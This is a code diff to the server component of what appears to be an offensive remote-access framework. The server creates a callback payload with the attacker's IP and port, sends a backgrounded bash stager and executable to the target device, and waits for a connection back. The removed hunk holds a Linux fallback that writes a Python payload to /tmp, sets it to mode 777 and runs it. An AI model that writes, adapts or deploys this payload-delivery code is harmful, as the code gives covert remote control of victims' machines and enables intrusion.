@@ -99,9 +99,11 @@ class Server:
     def craft_payload(self,device_arch):
         # TODO: Detect uid before we send executable
         if not self.host:
-            raise ValueError('Server host not set')
+            h.info_error("Local Host is not set")
+            return
         if not self.port:
-            raise ValueError('Server port not set')
+            h.info_error("Local Port is not set")
+            return
         payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":self.debug}))
         if device_arch in self.macos_architectures:
             self.verbose_print("Detected macOS")
@@ -127,21 +129,8 @@ class Server:
             "/.mpl "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
-            if device_arch == "Linux":
-                self.verbose_print("Detected Linux")
-            elif "GET / HTTP/1.1" in device_arch:
-                raise ValueError("MPL does not exploit safari, it is a payload loader.")
-            else:
-                h.info_general("Device unrecognized, trying python payload...")
-            f = open("resources/mpl.py", "rb")
-            payload = f.read()
-            f.close()
-            instructions = \
-            "cat >/tmp/mpl.py;"+\
-            "chmod 777 /var/tmp/mpl.py;"+\
-            "python /tmp/mpl.py "+payload_parameter+" &\n"
-            return (instructions,payload)
-
+            h.info_error("The device is not recognized!")
+            return
 
     def listen_for_stager(self):
         #craft shell script
@@ -171,18 +160,17 @@ class Server:
         try:
             bash_stager, executable = self.craft_payload(device_arch)
         except Exception as e:
-            h.info_error(str(e))
-            raw_input("Press the enter key to continue...")
+            raw_input("Press enter to continue...")
             return
-        self.verbose_print("Sending Payload...")
+        self.verbose_print("Sending MPL Payload...")
         self.debug_print(bash_stager.strip())
         conn.send(bash_stager)
 
         # send executable
-        self.debug_print("Sending Executable...")
+        self.debug_print("Sending MPL Executable...")
         conn.send(executable)
         conn.close()
-        self.verbose_print("Establishing Secure Connection...")
+        self.verbose_print("Establishing Connection...")
 
         try:
             return self.listen_for_executable_payload(s)
